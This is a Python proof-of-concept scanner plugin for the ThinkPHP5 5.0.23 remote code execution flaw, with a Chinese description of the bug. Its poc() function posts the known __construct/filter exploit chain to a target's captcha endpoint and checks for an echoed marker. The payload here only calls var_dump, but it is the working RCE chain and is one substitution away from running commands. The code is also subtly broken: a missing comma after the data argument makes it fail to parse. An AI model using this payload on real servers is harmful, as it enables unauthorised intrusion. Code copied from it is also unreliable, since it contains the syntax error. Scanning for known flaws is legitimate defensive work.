#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import requests
from urllib.parse import urlparse

requests.packages.urllib3.disable_warnings()

def get_plugin_info():
    plugin_info = {
        "name": "ThinkPHP5 5.0.23 远程代码执行漏洞",
        "desc": "其5.0.23以前的版本中，获取method的方法中没有正确处理方法名，导致攻击者可以调用Request类任意方法并构造利用链，从而导致远程代码执行漏洞，可导致服务器直接被入侵控制。",
        "grade": "中",
        "type": "web",
        "keyword": "tag:ThinkPHP5 version:5.0.23"
    }
    return plugin_info

def poc(arg):
    arg = arg if "://" in arg else f"http://{arg}"
    timeout = 5
    headers = {
        'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36",
        'Referer': arg
        }
    try:
        r = requests.post(
            url=f'{urlparse(arg).scheme}://{urlparse(arg).netloc}/index.php?s=captcha',
            data="_method=__construct&filter[]=var_dump&method=get&server[REQUEST_METHOD]=pGiopzVOki1L"
            headers=headers,
            timeout=timeout, 
            verify=False
            )
        if r.status_code == 200 and "string(12) \"pGiopzVOki1L\"" in r.text:
            return True
        else:
            return False
    except Exception as e:
        return 


if __name__ == '__main__':
    import sys
    if len(sys.argv) != 2:
        print("{} URL".format(sys.argv[0]))
    else:
        print("{} {}".format(sys.argv[1],poc(sys.argv[1])))  

